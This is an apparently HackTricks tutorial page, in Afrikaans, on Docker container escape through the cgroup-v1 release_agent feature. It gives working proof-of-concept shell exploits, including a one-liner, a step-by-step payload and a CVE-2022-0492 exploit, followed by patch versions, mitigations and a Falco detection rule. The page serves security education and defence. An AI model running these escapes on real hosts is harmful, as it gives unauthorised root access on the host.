# Docker release_agent cgroups escape

{{#include ../../../../banners/hacktricks-training.md}}

**Vir verdere besonderhede, verwys na die** [**oorspronklike blogpos**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**.** Dit is net 'n opsomming:

---

## Klassieke PoC (2019)
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
Die PoC misbruik die **cgroup-v1** `release_agent` kenmerk: wanneer die laaste taak van 'n cgroup wat `notify_on_release=1` het, verlaat, voer die kernel (in die **aanvanklike namespaces op die gasheer**) die program uit waarvan die padnaam in die skryfbare lêer `release_agent` gestoor is. Omdat daardie uitvoering met **volledige wortelprivileges op die gasheer** plaasvind, is dit genoeg om skryftoegang tot die lêer te verkry vir 'n houer ontsnapping.

### Kort, leesbare stap-vir-stap

1. **Bereid 'n nuwe cgroup voor**

```shell
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp   # of –o memory
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```

2. **Wys `release_agent` na aanvaller-beheerde skrip op die gasheer**

```shell
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```

3. **Laat die payload val**

```shell
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > "$host_path/output"
EOF
chmod +x /cmd
```

4. **Trigger die notifier**

```shell
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"   # voeg onsself by en verlaat onmiddellik
cat /output                                  # bevat nou gasheer prosesse
```

---

## 2022 kernel kwesbaarheid – CVE-2022-0492

In Februarie 2022 het Yiqi Sun en Kevin Wang ontdek dat **die kernel *nie* vermoëns verifieer wanneer 'n proses na `release_agent` in cgroup-v1 geskryf het** (funksie `cgroup_release_agent_write`).

Effectief **enige proses wat 'n cgroup hiërargie kon monteer (bv. via `unshare -UrC`) kon 'n arbitrêre pad na `release_agent` skryf sonder `CAP_SYS_ADMIN` in die *aanvanklike* gebruikersnaamruimte**. Op 'n standaard-gekonfigureerde, wortel-draende Docker/Kubernetes houer het dit toegelaat:

* privilige-eskalasie na wortel op die gasheer; ↗
* houer ontsnapping sonder dat die houer bevoorreg was.

Die fout is toegeken aan **CVE-2022-0492** (CVSS 7.8 / Hoog) en reggestel in die volgende kernel vrystellings (en al die latere):

* 5.16.2, 5.15.17, 5.10.93, 5.4.176, 4.19.228, 4.14.265, 4.9.299.

Patch commit: `1e85af15da28 "cgroup: Fix permission checking"`.

### Minimale eksploit binne 'n houer
```bash
# prerequisites: container is run as root, no seccomp/AppArmor profile, cgroup-v1 rw inside
apk add --no-cache util-linux  # provides unshare
unshare -UrCm sh -c '
mkdir /tmp/c; mount -t cgroup -o memory none /tmp/c;
echo 1 > /tmp/c/notify_on_release;
echo /proc/self/exe > /tmp/c/release_agent;     # will exec /bin/busybox from host
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
As die kern kwesbaar is, voer die busybox-binary van die *gasheer* uit met volle root.

### Versterking & Versagtings

* **Opdateer die kern** (≥ weergawes bo). Die patch vereis nou `CAP_SYS_ADMIN` in die *aanvanklike* gebruikersnaamruimte om na `release_agent` te skryf.
* **Verkies cgroup-v2** – die verenigde hiërargie **het die `release_agent` kenmerk heeltemal verwyder**, wat hierdie klas ontsnapte elimineer.
* **Deaktiveer onprivilegieerde gebruikersnaamruimtes** op gashere wat dit nie nodig het nie:
```shell
sysctl -w kernel.unprivileged_userns_clone=0
```
* **Verpligte toegangbeheer**: AppArmor/SELinux beleide wat `mount`, `openat` op `/sys/fs/cgroup/**/release_agent` ontken, of `CAP_SYS_ADMIN` laat val, stop die tegniek selfs op kwesbare kerne.
* **Lees-slegs bind-mask** al die `release_agent` lêers (Palo Alto skrip voorbeeld):
```shell
for f in $(find /sys/fs/cgroup -name release_agent); do
mount --bind -o ro /dev/null "$f"
done
```

## Opsporing tydens uitvoering

[`Falco`](https://falco.org/) verskaf 'n ingeboude reël sedert v0.32:
```yaml
- rule: Detect release_agent File Container Escapes
desc: Detect an attempt to exploit a container escape using release_agent
condition: open_write and container and fd.name endswith release_agent and
(user.uid=0 or thread.cap_effective contains CAP_DAC_OVERRIDE) and
thread.cap_effective contains CAP_SYS_ADMIN
output: "Potential release_agent container escape (file=%fd.name user=%user.name cap=%thread.cap_effective)"
priority: CRITICAL
tags: [container, privilege_escalation]
```
Die reël aktiveer op enige skryfpoging na `*/release_agent` vanaf 'n proses binne 'n houer wat steeds `CAP_SYS_ADMIN` besit.

## Verwysings

* [Unit 42 – CVE-2022-0492: container escape via cgroups](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/) – gedetailleerde analise en versagtingskrip.
* [Sysdig Falco reël & opsporingsgids](https://sysdig.com/blog/detecting-mitigating-cve-2022-0492-sysdig/)

{{#include ../../../../banners/hacktricks-training.md}}
